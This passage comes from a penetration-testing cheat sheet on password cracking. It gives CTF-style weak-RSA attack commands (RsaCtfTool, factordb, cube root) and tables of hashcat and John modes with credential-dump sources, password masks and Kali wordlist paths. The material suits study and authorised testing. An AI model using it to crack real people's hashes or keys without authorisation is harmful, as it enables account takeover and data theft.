print(f'hex = {hex(M)}')
print(f'txt = {long_to_bytes(M)}')   # if plaintext was bytes, not pure number
```

```bash
# Decimal plaintext integer to ASCII (when M is really a string)
python3 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(<DECIMAL_PT>))"

# Equivalent via hex round-trip
python3 -c "m = <DECIMAL_PT>; print(bytes.fromhex(format(m, 'x')).decode(errors='replace'))"
```

### 7.3 Only N Available — Factoring Attacks

```bash
# https://github.com/RsaCtfTool/RsaCtfTool — auto-tries every known weak-RSA attack
git clone https://github.com/RsaCtfTool/RsaCtfTool
cd RsaCtfTool && pip install -r requirements.txt

# From a captured public key file
python3 RsaCtfTool.py --publickey <PUBKEY_PEM> --uncipherfile <CIPHERTEXT_FILE>

# From raw N, E, C
python3 RsaCtfTool.py -n <N> -e <E> --uncipher <CIPHERTEXT> --attack all

# Targeted single attacks (faster when you suspect the weakness)
python3 RsaCtfTool.py -n <N> -e <E> --attack fermat        # close primes
python3 RsaCtfTool.py -n <N> -e <E> --attack wiener        # small d, large e
python3 RsaCtfTool.py -n <N> -e <E> --attack factordb      # already-factored
python3 RsaCtfTool.py -n <N> -e <E> --attack pollard_p_1   # smooth p-1
python3 RsaCtfTool.py -n <N> -e <E> --attack smallq        # one prime tiny
```

```bash
# Manual factordb lookup — N seen before? Prebuilt factor list returned instantly
curl -s "http://factordb.com/api?query=<N>" | python3 -m json.tool
```

### 7.4 Low Public Exponent + Small Message — Direct Cube Root

```python
# When E is small (typically 3) and M^E less than N, plaintext is just the E-th root of C
# No factoring needed.
import gmpy2
from Crypto.Util.number import long_to_bytes

C = <CIPHERTEXT>
E = <E>

m, exact = gmpy2.iroot(C, E)
if exact:
    print(long_to_bytes(int(m)))
else:
    print('Not a small-message case — try padding-aware attacks (Coppersmith, Hastad)')
```

### 7.5 Quick Reference — Which Attack Fits Which Leak

| You have | Attack | Section |
|---|---|---|
| P, Q, E, C | Textbook decrypt (d = e inverse mod phi) | 7.2 |
| N, E, C — N already on factordb | factordb lookup | 7.3 |
| N, E, C — close primes | Fermat factorization | 7.3 |
| N, E, C — small d, huge e | Wiener attack | 7.3 |
| N, E, C — p-1 smooth | Pollard p-1 | 7.3 |
| N, E=3, C — short plaintext | Cube root (no factoring) | 7.4 |
| N1,N2,N3 + same M, E=3 | Hastad broadcast | RsaCtfTool --attack hastad |
| Partial M (high bits known) | Coppersmith / stereotyped | RsaCtfTool |

> **Tip:** if RsaCtfTool's `--attack all` runs more than 2 minutes with no result, the weakness is probably in the *padding* or the *protocol* (e.g. Bleichenbacher PKCS#1 v1.5, oracle padding) — that's a separate workflow, not a parameter leak.

[↑ Top](#password-cracking-methodology)

---

## Quick Reference Tables

### Hash Type → Hashcat Mode → John Format → Source

| Hash Type | Hashcat Mode | John Format | Common Source |
|---|---|---|---|
| NTLM | 1000 | nt | SAM dump, secretsdump, Mimikatz |
| NetNTLMv1 | 5500 | netntlm | Responder, MITM |
| NetNTLMv2 | 5600 | netntlmv2 | Responder, MITM |
| LM | 3000 | lm | Legacy SAM dump |
| MSCache2 / DCC2 | 2100 | mscash2 | secretsdump (cached creds) |
| Kerberoast RC4 | 13100 | krb5tgs | GetUserSPNs.py, Rubeus |
| Kerberoast AES-128 | 19600 | krb5tgs | GetUserSPNs.py |
| Kerberoast AES-256 | 19700 | krb5tgs | GetUserSPNs.py |
| AS-REP Roast | 18200 | krb5asrep | GetNPUsers.py, Rubeus |
| Kerberos AES-256 Pre-Auth | 19900 | — | Network capture |
| MD5 | 0 | raw-md5 | Web apps, databases |
| SHA-1 | 100 | raw-sha1 | Web apps |
| SHA-256 | 1400 | raw-sha256 | Web apps |
| SHA-512 | 1700 | raw-sha512 | Web apps |
| MD5 crypt (`$1$`) | 500 | md5crypt | Linux /etc/shadow |
| SHA-256 crypt (`$5$`) | 7400 | sha256crypt | Linux /etc/shadow |
| SHA-512 crypt (`$6$`) | 1800 | sha512crypt | Linux /etc/shadow |
| yescrypt (`$y$`) | — | yescrypt | Linux /etc/shadow (modern) |
| bcrypt (`$2a$`/`$2b$`) | 3200 | bcrypt | Web apps |
| MySQL 4.1+ | 300 | mysql-sha1 | MySQL database |
| MSSQL 2012+ | 1731 | mssql12 | MSSQL database |
| PostgreSQL MD5 | — | dynamic_1 | PostgreSQL |
| KeePass | 13400 | keepass | .kdbx file |
| SSH Key | 22911/22921/22931 | ssh | id_rsa, id_ecdsa |
| PKZIP | 17200 / 17210 | pkzip | .zip file |
| RAR3 | 12500 | rar | .rar file |
| RAR5 | 13000 | rar5 | .rar file |
| 7-Zip | 11600 | 7z | .7z file |
| PDF 1.4-1.6 | 10500 | pdf | .pdf file |
| PDF 1.7 L8 | 10700 | pdf | .pdf file |
| MS Office 2007 | 9400 | office | .docx/.xlsx |
| MS Office 2013+ | 9600 | office | .docx/.xlsx |
| BitLocker | 22100 | bitlocker | Encrypted drive |
| PFX / PKCS#12 | — | pfx | .pfx/.p12 certificate |
| GPG | — | gpg | GPG private key |
| WPA/WPA2 | 22000 | wpapsk | Wi-Fi handshake |

### Common Masks Reference

| Mask | Pattern | Example | Use Case |
|---|---|---|---|
| `?l?l?l?l?l?l` | 6 lowercase | `summer` | Simple words |
| `?l?l?l?l?l?l?l?l` | 8 lowercase | `password` | Common passwords |
| `?u?l?l?l?l?l?d?d` | Ullllldd | `Spring25` | Season+Year |
| `?u?l?l?l?l?l?l?d?d?d?d` | Ulllllldddd | `Winter2025` | Season+FullYear |
| `?u?l?l?l?l?l?l?d?d?d?d?s` | Ulllllldddd! | `Summer2025!` | Season+Year+Special |
| `?u?l?l?l?l?l?l?l?d?s` | Ulllllllld! | `Password1!` | Classic pattern |
| `?d?d?d?d?d?d` | 6 digits | `123456` | PIN codes |
| `?d?d?d?d?d?d?d?d` | 8 digits | `20250415` | Date-based |
| `?u?l?l?l?l?l?l?l?d?d?d?d` | Ullllllldddd | `Welcome2025` | Welcome pattern |
| `?l?l?l?l?l?l?l?l?d?d?d?d?s` | lllllllldddd! | `password2025!` | Long common |

### Wordlist Locations on Kali Linux

| Wordlist | Path |
|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` |
| SecLists Passwords | `/usr/share/seclists/Passwords/` |
| SecLists Usernames | `/usr/share/seclists/Usernames/` |
| darkweb2017-top10000 | `/usr/share/seclists/Passwords/darkweb2017-top10000.txt` |
| xato-net-10-million | `/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt` |
| 10M top 1M | `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` |
| best1050 | `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt` |
| SNMP community strings | `/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt` |
| Default credentials | `/usr/share/seclists/Passwords/Default-Credentials/` |
| Hashcat rules dir | `/usr/share/hashcat/rules/` |
| John rules dir | `/etc/john/john.conf` (rules section) |
| best64.rule | `/usr/share/hashcat/rules/best64.rule` |
| OneRuleToRuleThemAll | `/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule` |
| dive.rule | `/usr/share/hashcat/rules/dive.rule` |

[↑ Top](#password-cracking-methodology)
